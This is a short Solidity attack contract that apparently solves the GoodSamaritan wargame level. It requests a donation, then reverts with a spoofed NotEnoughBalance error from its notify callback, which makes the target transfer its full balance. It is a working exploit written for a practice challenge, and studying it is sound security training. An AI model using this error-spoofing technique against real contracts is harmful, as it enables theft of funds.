pragma solidity ^0.8.0; 

import "../src/GoodSamaritan.sol";

contract Attacker is INotifyable {

    error NotEnoughBalance();
    
    function attack(address goodSamaritanAddress) external {
        GoodSamaritan goodSamaritan = GoodSamaritan(goodSamaritanAddress);
        goodSamaritan.requestDonation();
    }

    function notify(uint256 amount) external override {
        if(amount == 10)
        revert NotEnoughBalance();
    }

}